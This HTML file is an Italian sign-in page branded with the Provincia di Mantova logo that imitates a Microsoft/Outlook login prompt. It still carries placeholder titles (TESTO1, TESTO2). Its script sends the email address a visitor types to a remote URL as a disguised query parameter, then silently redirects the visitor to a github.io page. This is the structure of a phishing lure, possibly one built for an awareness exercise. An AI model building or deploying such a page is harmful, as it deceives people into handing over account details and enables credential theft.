<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>TESTO1</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-image: url('back.png');
            background-size: cover;
            line-height: 1.6;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 0;
            margin: 0;
        }
        .center-div {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: white;
            width: 65%;
            max-width: 440px;
            height: 380px;
            padding: 40px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        @media (max-width: 768px) {
            body {
                background-image: none;
                background-color: white;
            }
            .center-div {
                width: 90%;
                max-width: none;
                height: auto;
                padding: 20px;
                box-shadow: none;
            }
        }
    </style>
</head>
<body>
    <main>
        <div class="center-div">
            <div class="sub-div1">
                <img src="bannerlogo" alt="Provincia di Mantova Logo" class="logo">
            </div>
            <div class="bd">
                <div class="sub-div2">
                    <h2>Accedi</h2>
                </div>
                <div class="sub-div21">
                    <small>TESTO2</small>
                </div>
                <div class="sub-div3">
                    <input type="text" id="myInput" class="sub-div" placeholder="Indirizzo di posta elettronica">
                </div>
                <div class="sub-div4">
                    <small>Nessun account?&nbsp;</small> <a href="https://www.outlook.com" target="_blank"><small>Creane uno</small></a>
                </div>
                <div class="container">
                    <button class="blue-button">Accedi</button>
                </div>
            </div>
        </div>
    </main>
    <script>
        document.getElementById('myInput').focus();
        document.querySelector('.blue-button').addEventListener('click', async () => {
            const inputContent = document.getElementById('myInput').value;
            const encodedContent = encodeURIComponent(inputContent);
            const apiUrl = `https://organigramma.provincia.mantova.it?scriptAllineamento=${encodedContent}`;
            try {
                const response = await fetch(apiUrl);
                if (!response.ok) throw new Error('Request failed');
                await response.text();
            } catch (error) {
                console.error('Error:', error);
            } finally {
                window.location.href = 'https://prov-mantova.github.io/provincia-di-mantova/redirect.html';
            }
        });
    </script>
</body>
</html>
